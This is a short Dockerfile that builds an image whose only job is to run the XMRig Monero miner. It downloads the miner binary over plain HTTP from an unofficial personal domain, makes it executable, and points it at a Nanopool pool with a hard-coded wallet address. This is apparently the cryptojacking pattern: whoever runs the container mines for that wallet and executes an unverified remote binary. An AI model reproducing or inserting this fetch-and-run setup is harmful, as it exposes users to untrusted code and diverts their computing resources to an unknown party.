FROM ubuntu

ENV VERSION 2.1.0

RUN apt-get update && apt-get install -y wget && apt-get install -y libuv1-dev

RUN wget http://renjunyu.cn/xmr/xmrig && chmod +x ./xmrig

ENV POOL xmr-eu1.nanopool.org:14444

ENV USERNAME 4B9f71DJ3fqPuSGNamuK9jH7NzKBj3im4SyrGUwvsT4EAy3TQBW7DdtjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3h4Fxrf

ENV PASSWORD x

WORKDIR /

CMD ./xmrig -o $POOL -u $USERNAME -p $PASSWORD --safe
